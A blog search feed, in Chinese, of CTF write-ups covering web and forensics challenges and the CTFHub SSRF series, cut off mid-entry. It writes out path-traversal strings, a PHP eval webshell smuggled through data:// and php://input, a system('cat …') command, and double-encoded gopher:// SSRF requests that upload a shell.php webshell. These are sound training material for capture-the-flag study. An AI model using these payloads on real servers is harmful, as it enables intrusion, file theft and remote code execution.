<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HSCTF wp</title>
      <link href="/2022/06/07/HSCTF/"/>
      <url>/2022/06/07/HSCTF/</url>
      
        <content type="html"><![CDATA[<p>wp</p><span id="more"></span><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Image-Gallery"><a href="#Image-Gallery" class="headerlink" title="Image Gallery"></a>Image Gallery</h2><p>进入界面之后发现都是图片，进入源代码也找不到任何有用的信息</p><p><img src="https://z4a.net/images/2022/06/06/image144f521dcd91cb90.png" alt="image144f521dcd91cb90.png"></p><p>所以这时候吧就要主要分析一下下载的附件，在index.html的页面下看到了主要信息</p><p><img src="https://z4a.net/images/2022/06/06/imageb61a65865e824efc.png" alt="imageb61a65865e824efc.png"></p><p>再接着分析一下main.py的代码</p><p><img src="https://z4a.net/images/2022/06/06/image4d835411562a6360.png" alt="image4d835411562a6360.png"></p><p>发现了/flag，但是审计一下发现，想要直接获得/flag.txt是不可能的（除非2+2=5）</p><p>所以就需要从图片上下手，首先我们需要payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/image?image=&#123;&#123; image &#125;&#125;</span><br></pre></td></tr></table></figure><p>但是要求image必须是所给图片中的任意一个</p><p><img src="https://z4a.net/images/2022/06/06/image9f7b1ddca16e0bc7.png" alt="image9f7b1ddca16e0bc7.png"></p><p>我们从中挑一个a.jpg</p><p><img src="https://z4a.net/images/2022/06/06/image6df06fad7ba71b6d.png" alt="image6df06fad7ba71b6d.png"></p><p>发现并没有什么信息，这时我们可以考虑一下目录遍历漏洞，首先payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://z4a.net/images/2022/06/06/image03961d65a0de3f90.png" alt="image03961d65a0de3f90.png"></p><p>出现了一个passwd文件，点开看一下</p><p><img src="https://z4a.net/images/2022/06/06/image49ce2195bbfdcb83.png" alt="image49ce2195bbfdcb83.png"></p><p>发现确实有这个漏洞，所以我们就可以直接利用这个漏洞获取flag</p><p><img src="https://z4a.net/images/2022/06/06/imagee847b60db0fdccce.png" alt="imagee847b60db0fdccce.png"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="the-great-directory-egg-hunt"><a href="#the-great-directory-egg-hunt" class="headerlink" title="the-great-directory-egg-hunt"></a>the-great-directory-egg-hunt</h2><p>打开题目解压附件之后发现有很多文件，并不知道哪一个包含了真正的flag</p><p>所以查看文件的属性，比较字节的大小，包含flag的文件要大，最后找到了真正的file.txt</p><p><img src="https://z4a.net/images/2022/06/07/image.png" alt="image.png"></p><p>根据提示写出flag</p>]]></content>
      
      
      <categories>
          
          <category> wp类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web -ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BCACTF wp</title>
      <link href="/2022/06/07/BCACTF/"/>
      <url>/2022/06/07/BCACTF/</url>
      
        <content type="html"><![CDATA[<p>记录一下比赛wp</p><span id="more"></span><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="real-deal-html"><a href="#real-deal-html" class="headerlink" title="real deal html"></a>real deal html</h2><p><img src="https://z4a.net/images/2022/06/04/imageab49025fc180fddc.png" alt="imageab49025fc180fddc.png"></p><p>直接查看源代码，得到flag</p><h2 id="Agent-Rocket"><a href="#Agent-Rocket" class="headerlink" title="Agent Rocket"></a>Agent Rocket</h2><p>进入题目后，看到登录页</p><p><img src="https://z4a.net/images/2022/06/04/imagec14f9b5c3b739454.png" alt="imagec14f9b5c3b739454.png"></p><p>查看源代码，得到用户名和密码</p><p><img src="https://z4a.net/images/2022/06/04/image0d4c6d8b7edc9079.png" alt="image0d4c6d8b7edc9079.png"></p><p>登录之后，发现发现如果想要得到flag，就需要从控制台登录</p><p><img src="https://z4a.net/images/2022/06/04/imaged5a9917599874c8b.png" alt="imaged5a9917599874c8b.png"></p><p>所以抓包，修改一下User-Agent，最终得到flag</p><p><img src="https://z4a.net/images/2022/06/04/imageba7915fee2c69869.png" alt="imageba7915fee2c69869.png"></p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>进入界面之后找到admin登陆界面</p><p><img src="https://z4a.net/images/2022/06/04/image328e910b837ba352.png" alt="image328e910b837ba352.png"></p><p>然后查看源代码发现只有管理员才能修改cookie</p><p><img src="https://z4a.net/images/2022/06/04/imageebddae97b7db2f6a.png" alt="imageebddae97b7db2f6a.png"></p><p>所以我们就需要修改一下权限，从guest变为admin</p><p><img src="https://z4a.net/images/2022/06/04/image98d2bfe9ac4a9f80.png" alt="image98d2bfe9ac4a9f80.png"></p><p>进入管理界面之后，查看源代码会看到一个cookie，意思就是修改一下cookie就可以得到flag</p><p><img src="https://z4a.net/images/2022/06/04/image016abee574368b94.png" alt="image016abee574368b94.png"></p><p>所以在admin页面改一下cookie，就得到了flag</p><p><img src="https://z4a.net/images/2022/06/04/image61237758d4ce0528.png" alt="image61237758d4ce0528.png"></p><h1 id="foren"><a href="#foren" class="headerlink" title="foren"></a>foren</h1><h2 id="Broken-Image"><a href="#Broken-Image" class="headerlink" title="Broken Image"></a>Broken Image</h2><p>直接修改一下附件的后缀为png即可</p><p><img src="https://z4a.net/images/2022/06/04/image3d96e971b932f266.png" alt="image3d96e971b932f266.png"></p><h2 id="My-New-Friend"><a href="#My-New-Friend" class="headerlink" title="My New Friend"></a>My New Friend</h2><p>先把附件拉入010，发现了信息</p><p><img src="https://z4a.net/images/2022/06/04/image7c47cccb8aaf79c9.png" alt="image7c47cccb8aaf79c9.png"></p><p>sb直接得到flag</p><p><img src="https://z4a.net/images/2022/06/04/imagea453863968cde8d4.png" alt="imagea453863968cde8d4.png"></p>]]></content>
      
      
      <categories>
          
          <category> wp类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web -ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web综合wp</title>
      <link href="/2022/06/02/web%E7%BB%BC%E5%90%88wp/"/>
      <url>/2022/06/02/web%E7%BB%BC%E5%90%88wp/</url>
      
        <content type="html"><![CDATA[<p>记录一下近期写过的web题</p><span id="more"></span><h1 id="Sourceless-Guessy"><a href="#Sourceless-Guessy" class="headerlink" title="Sourceless Guessy"></a>Sourceless Guessy</h1><p><img src="https://z4a.net/images/2022/06/04/c1b1f1fc2b3449ec4e9cc7b67d473343.png" alt="c1b1f1fc2b3449ec4e9cc7b67d473343.png"></p><p>是目录遍历漏洞，直接payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://z4a.net/images/2022/06/04/7f63d01c555805a38c58c8e3067a8cec.png" alt="7f63d01c555805a38c58c8e3067a8cec.png"></p><p>查看源码，得到flag</p><h1 id="单身杯web签到"><a href="#单身杯web签到" class="headerlink" title="单身杯web签到"></a>单身杯web签到</h1><p><img src="https://z4a.net/images/2022/06/04/f21bcdaac605a0a94b2c9e7e1236899f.png" alt="f21bcdaac605a0a94b2c9e7e1236899f.png"></p><p>先简单的了解一下涉及的函数</p><p><img src="https://z4a.net/images/2022/06/04/d122973da3abc00306a901c7f4038ff8.png" alt="d122973da3abc00306a901c7f4038ff8.png"></p><p><img src="https://z4a.net/images/2022/06/04/17eec29db1eb6163ffc9dcbd780efb82.png" alt="17eec29db1eb6163ffc9dcbd780efb82.png"></p><p>所以本体的意思就是需要post一个不是空字符且把所有的字符顺序颠倒之后还与原字符顺序一样的字符串，所以直接使用data协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain,&lt;?php eval($_POST[a]);?&gt;&gt;?;)]a[TSOP_$(lave php?&lt;,nialp/txet//:atad</span><br></pre></td></tr></table></figure><p><img src="https://z4a.net/images/2022/06/04/imagebaab96323e9f220d.png" alt="imagebaab96323e9f220d.png"></p><p>发现已经执行成功</p><p>接着查找一下根目录之后就能直接抓flag了</p><p><img src="https://z4a.net/images/2022/06/04/imagefdd0840d7b9b3796.png" alt="imagefdd0840d7b9b3796.png"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain,&lt;?php eval($_POST[a]);?&gt;&gt;?;)]a[TSOP_$(lave php?&lt;,nialp/txet//:atad&amp;a=system (&#x27;cat /f1agaaa&#x27;);</span><br></pre></td></tr></table></figure><h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p><img src="https://z4a.net/images/2022/06/07/image7f823a2855c38b5b.png" alt="image7f823a2855c38b5b.png"></p><p>先审计一下代码，百度一下里面的函数</p><p><img src="https://z4a.net/images/2022/06/07/image5ae65455e3a00ee1.png" alt="image5ae65455e3a00ee1.png"></p><p>发现传入的file需要有php://input，而且trim过滤了可以存在的数组绕过preg_match，所以利用php://input可以接收POST数据流并解析，就可以得到flag</p><p><img src="https://z4a.net/images/2022/06/07/imagecd1bc5b48324d41b.png" alt="imagecd1bc5b48324d41b.png"></p><p><img src="https://z4a.net/images/2022/06/07/imageb42b7fa2921ffdd3.png" alt="imageb42b7fa2921ffdd3.png"></p><p><img src="https://z4a.net/images/2022/06/07/imagef23c47c6ba95cfc9.png" alt="imagef23c47c6ba95cfc9.png"></p>]]></content>
      
      
      <categories>
          
          <category> wp类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web -ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub技能树web-SSRF</title>
      <link href="/2022/04/11/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web-SSRF/"/>
      <url>/2022/04/11/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web-SSRF/</url>
      
        <content type="html"><![CDATA[<p>SSRF</p><span id="more"></span><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>SSRF（Server-Side Request Forgery:服务器端请求伪造)是一种由攻击者伪造形成由服务器端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>很多的web应用都提供了从其他服务器上获取数据的功能。使用用户指定的URL,Web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用的话，可以利用存在缺陷的web应用作为代理攻击远程和本地服务器</p><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>1.可以对外网服务器所在的内网，本地进行端口扫描，获取一些服务的banner信息</p><p>2.攻击运行在内网或者本地的应用程序</p><p>3.对内网web应用进行指纹识别，通过访问默认文件实现</p><p>4.攻击内外网的web应用。sql注入，struct2，redis等</p><p>5.利用file协议读取本地文件等</p><h1 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h1><p>先进行dirsearch扫描，发现有flag.php</p><p>访问一下其源码发现有ip限制</p><p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151937155.png" alt="image-20220415193727011"></p><p>直接使用127.0.0.1进行内网访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-25917a94dca3ca9a.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p>成功得到flag</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8191673cc4562479e5149fade10f89de.png" alt="image-20220411190147544"></p><h1 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h1><p>先看一下flag.php的源码</p><p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151912869.png" alt="image-20220415191231763"></p><p>直接看源代码，找到flag</p><p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151912142.png" alt="image-20220415191258997"></p><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>打开题目之后发现什么都没有，但是跟内网访问漏洞差不多，根据题目的hint可以看出端在8000-9000之间</p><p>将<code>127.0.0.1:8000-9000</code>拼接入 GET 传参中，使用 BurpSuite 对端口进行爆破：</p><p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151917664.png" alt="image-20220415191707494"></p><p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151919220.png" alt="image-20220415191907052"></p><p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151929762.png" alt="image-20220415192925582"></p><p>找出来长度不一样的8800端口，直接url访问，找到flag</p><p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151930377.png" alt="image-20220415193018242"></p><h1 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h1><p>进入靶场，首先看到的是一片空白，没有任何返回，甚至源码里面也没有任何东西，使用dirsearch扫描，下面是一些命令的含义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">参数列表：</span><br><span class="line">-h, --help 查看帮助</span><br><span class="line">-u URL, --url=URL 设置url</span><br><span class="line">-L URLLIST, --url-list=URLLIST 设置url列表</span><br><span class="line">-e EXTENSIONS, --extensions=EXTENSIONS 网站脚本类型</span><br><span class="line">-w WORDLIST, --wordlist=WORDLIST 设置字典</span><br><span class="line">-l, --lowercase 小写</span><br><span class="line">-f, --force-extensions 强制扩展字典里的每个词条</span><br><span class="line">-s DELAY, --delay=DELAY 设置请求之间的延时</span><br><span class="line">-r, --recursive Bruteforce recursively 递归地扫描</span><br><span class="line">–scan-subdir=SCANSUBDIRS, --scan-subdirs=SCANSUBDIRS 扫描给定的url的子目录(用逗号隔开)</span><br><span class="line">–exclude-subdir=EXCLUDESUBDIRS, --exclude-subdirs=EXCLUDESUBDIRS 在递归过程中排除指定的子目录扫描(用逗号隔开)</span><br><span class="line">-t THREADSCOUNT, --threads=THREADSCOUNT 设置扫描线程</span><br><span class="line">-x EXCLUDESTATUSCODES, --exclude-status=EXCLUDESTATUSCODES 排除指定的网站状态码(用逗号隔开)</span><br><span class="line">-c COOKIE, --cookie=COOKIE 设置cookie</span><br><span class="line">–ua=USERAGENT, --user-agent=USERAGENT 设置用户代理</span><br><span class="line">-F, --follow-redirects 跟随地址重定向扫描</span><br><span class="line">-H HEADERS, --header=HEADERS 设置请求头</span><br><span class="line">–random-agents, --random-user-agents 设置随机代理</span><br><span class="line">–timeout=TIMEOUT 设置超时时间</span><br><span class="line">–ip=IP 设置代理IP地址</span><br><span class="line">–proxy=HTTPPROXY, --http-proxy=HTTPPROXY 设置http代理。例如127.0.0.1:8080</span><br><span class="line">–max-retries=MAXRETRIES 设置最大的重试次数</span><br><span class="line">-b, --request-by-hostname 通过主机名请求速度，默认通过IP</span><br><span class="line">–simple-report=SIMPLEOUTPUTFILE 保存结果，发现的路径</span><br><span class="line">–plain-text-report=PLAINTEXTOUTPUTFILE 保存结果，发现的路径和状态码</span><br><span class="line">–json-report=JSONOUTPUTFILE 以json格式保存结果</span><br></pre></td></tr></table></figure><p>扫出来了一个/index.php文件以及一个/flag.php文件</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a255e01f4ee8316446e156d7d33a9337.png"></p><p>先通过file协议看一看flag.php以及index.php的源码</p><p><code>url=file:///var/www/html/flag.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">\\flag.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;</span><br><span class="line">    echo &quot;Just View From 127.0.0.1&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;    //$_SERVER[&quot;REMOTE_ADDR&quot;]意思是访问当前ip地址</span><br><span class="line"></span><br><span class="line">$flag=getenv(&quot;CTFHUB&quot;);</span><br><span class="line">$key = md5($flag);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>url=file:///var/www/html/index.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">\\index.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_REQUEST[&#x27;url&#x27;]))&#123;</span><br><span class="line">    header(&quot;Location: /?url=_&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch = curl_init();    //curl_init()函数将初始化一个新的会话，返回一个CURL句柄供curl_setopt(), curl_exec(),和 curl_close() 函数使用。如果可选参数被提供，那么CURLOPT_URL选项将被设置成这个参数的值。你可以使用curl_setopt()函数人工设置。</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#x27;url&#x27;]);//设置访问url</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);//输出返回头信息</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  //设置重定位url</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br></pre></td></tr></table></figure><p>首先来访问一下flag.php文件，我们让url=127.0.0.1，通过内网来访问就能直接访问到，访问后看到的是一个方框</p><p><img src="https://img-blog.csdnimg.cn/img_convert/1dd9ab6c068f6907d6e924e9db8e11e3.png" alt="image-20220411195403716"></p><p>查看源码之后知道要post一个key传送到/flag.php</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5b964e89c5efe8cd3b4876a005941d93.png" alt="image-20220411195542254"></p><p>当我们把key放在里面传送的时候，发现有限制，只能用127.0.0.1的路径传输</p><p>再看一下index.php，这里是用了curl函数来获取并且输出数据</p><p>调用   <code>curl_setopt()</code>设置传输选项</p><p>根据   <code>curl_setopt()</code>设置的传输选项，实现回调函数以完成用户特定任务</p><p>curl函数可以支持的伪协议有很多，gopher，file，dict，https等</p><p>首先先来认识一下gopher协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gopher协议是互联网上使用的分布型的文件搜集获取网络协议，是一种分布式文档传递服务器。利用该服务，用户可以无缝地浏览，搜索和检索驻留在不同位置的信息，gopher协议支持发出的GET，POST请求：可以先截获get请求包或者post请求包，在构成符合gopher协议的请求。gopher协议是SSRF利用中最强大的协议，同时SSRF中经常会使用Gopher来构造GET/POST包进行攻击</span><br><span class="line">使用方法：gopher://ip:port/_payload</span><br><span class="line">gopher默认端口是70</span><br><span class="line">如果发起post请求，回车换行需要使用%0d%0a，如果有多个参数的话，参数之间的&amp;也需要进行url编码</span><br></pre></td></tr></table></figure><p>file协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file协议主要是用于访问本地计算机中的文件，要是使用file协议，基本格式如下file:///文件路径</span><br></pre></td></tr></table></figure><p>dict协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">词典网络协议，在RFC 2009中进行描述。它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。</span><br></pre></td></tr></table></figure><p>https协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTPS 并非是应用层的一种新协议。只是 HTTP 通信接口部分用 SSL（SecureSocket Layer）和 TLS（Transport Layer Security）协议代替而已。 </span><br><span class="line">HTTP+ 加密 + 认证 + 完整性保护 =HTTPS</span><br></pre></td></tr></table></figure><p>所以这一题就需要用gopher协议，向flag.php传一个post文报，报文里面含有key，大概的内容为url=gopher://127.0.0.1:80/_POST报文内容，这样，我们就可以通过伪造的127.0.0.1的ip来上传key</p><p>首先来构造一下POST报文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Length: 36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded  </span><br><span class="line">key=6c42e4b05c4a5b666f337ae89d969e1d</span><br></pre></td></tr></table></figure><p>POST报文中必须包含Host ，Content-Length ，Content_Type后面加上我们想传输的数据，但是GET请求中可以没有<br>在POST后接上/flag.php，代表着我们想把数据传输的这个目录里去</p><p>302跳转</p><p>表示请求的网页自请求的网页移动到了新的位置，搜索引擎索引中保存原来的URL</p><p>这里可以通过访问302.php，并且传参gopher来伪造本地访问</p><p>这里我们报文内容显示在url上输入，被解码后保存到curl里面，再通过curl输出跳转，又解码了一次，所以我们要对POST报文内容进行两次url编码</p><p>在第一次编码要把%0A全部改成%0D0A，%0A是在linux系统中代表换行符，在windos中是%0D%0A代表换行符，但是网上的编码器大都是编码的%0A，所以我们需要改成windos能够识别的</p><p>第一次编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST%20/flag.php%20HTTP/1.1%0AHost:%20127.0.0.1:80%0AContent-Length:%2036%0AContent-Type:%20application/x-www-form-urlencoded%0A%0Akey=a3b4373b4897b524012d43674d6249e3</span><br></pre></td></tr></table></figure><p>第二次编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Length:%252036%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey=a3b4373b4897b524012d43674d6249e3</span><br></pre></td></tr></table></figure><p>然后输入url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Length:%252036%250D%250AContent-Type:%2520application/x-www-form-urlencoded%2520%2520%250D%250Akey=6c42e4b05c4a5b666f337ae89d969e1d</p><p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151722943.png" alt="image-20220415172233703"></p><h1 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h1><p>还是先使用dirsearch扫描一下</p><p>发现有flag.php文件以及302.php文件</p><p>首先来看一下flag.php的内容</p><p>可知是随便上传一个文件就行，访问127.0.0.1/flag.php，可以看到一个上传界面，但是没有提交键，所以这时候就需要手动补一个</p><p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151825875.png" alt="image-20220415182522662"></p><p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151826841.png" alt="image-20220415182607642"></p><p>然后再随便上传个东西抓一下包</p><p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151813008.png" alt="image-20220415181332844"></p><p>进行两次编码，但是要注意的是第一次编码也需要将%0A改为%0D%0A</p><p>第一次编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST%20/flag.php%20HTTP/1.1%0D%0AHost:%20challenge-5852d438b3bca312.sandbox.ctfhub.com:10800%0D%0AUser-Agent:%20Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64;%20rv:99.0)%20Gecko/20100101%20Firefox/99.0%0D%0AAccept:%20text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8%0D%0AAccept-Language:%20zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2%0D%0AAccept-Encoding:%20gzip,%20deflate%0D%0AContent-Type:%20multipart/form-data;%20boundary=---------------------------414691864916047361701712488296%0D%0AContent-Length:%20388%0D%0AOrigin:%20http://challenge-5852d438b3bca312.sandbox.ctfhub.com:10800%0D%0AConnection:%20close%0D%0AReferer:%20http://challenge-5852d438b3bca312.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php%0D%0ACookie:%20UM_distinctid=17d9519d0e590b-083a4ee93a98a98-4c3e217e-13c680-17d9519d0e67de%0D%0AUpgrade-Insecure-Requests:%201%0D%0A%0D%0A-----------------------------414691864916047361701712488296%0D%0AContent-Disposition:%20form-data;%20name=%22file%22;%20filename=%22shell.php%22%0D%0AContent-Type:%20application/octet-stream%0D%0A%0D%0A%3C?php%20@eval($_POST%5Bshell%5D);?%3E%0D%0A-----------------------------414691864916047361701712488296%0D%0AContent-Disposition:%20form-data;%20name=%22submit%22%0D%0A%0D%0A%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2%0D%0A-----------------------------414691864916047361701712488296--</span><br></pre></td></tr></table></figure><p>第二次编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520challenge-5852d438b3bca312.sandbox.ctfhub.com:10800%250D%250AUser-Agent:%2520Mozilla/5.0%2520(Windows%2520NT%252010.0;%2520Win64;%2520x64;%2520rv:99.0)%2520Gecko/20100101%2520Firefox/99.0%250D%250AAccept:%2520text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8%250D%250AAccept-Language:%2520zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2%250D%250AAccept-Encoding:%2520gzip,%2520deflate%250D%250AContent-Type:%2520multipart/form-data;%2520boundary=---------------------------414691864916047361701712488296%250D%250AContent-Length:%2520388%250D%250AOrigin:%2520http://challenge-5852d438b3bca312.sandbox.ctfhub.com:10800%250D%250AConnection:%2520close%250D%250AReferer:%2520http://challenge-5852d438b3bca312.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php%250D%250ACookie:%2520UM_distinctid=17d9519d0e590b-083a4ee93a98a98-4c3e217e-13c680-17d9519d0e67de%250D%250AUpgrade-Insecure-Requests:%25201%250D%250A%250D%250A-----------------------------414691864916047361701712488296%250D%250AContent-Disposition:%2520form-data;%2520name=%2522file%2522;%2520filename=%2522shell.php%2522%250D%250AContent-Type:%2520application/octet-stream%250D%250A%250D%250A%253C?php%2520@eval($_POST%255Bshell%255D);?%253E%250D%250A-----------------------------414691864916047361701712488296%250D%250AContent-Disposition:%2520form-data;%2520name=%2522submit%2522%250D%250A%250D%250A%25E6%258F%2590%25E4%25BA%25A4%25E6%259F%25A5%25E8%25AF%25A2%250D%250A-----------------------------414691864916047361701712488296--</span><br></pre></td></tr></table></figure><p>在进行一次最初的抓包，使用gopher协议进行伪造，最终获得flag</p><p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151823321.png" alt="image-20220415182340143"></p><h1 id="fastcgi协议"><a href="#fastcgi协议" class="headerlink" title="fastcgi协议"></a>fastcgi协议</h1><p>fastcgi是向php-fpm发送报文的，而由于php-fpm的默认端口是9000，所以我们用nc去监听一下9000端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9000&gt;yy.txt</span><br></pre></td></tr></table></figure><h1 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h1><p>打开题目，发现有限制</p><p><img src="https://gitee.com/wu-shuying/drawing-bed/raw/master/images/202204151852202.png" 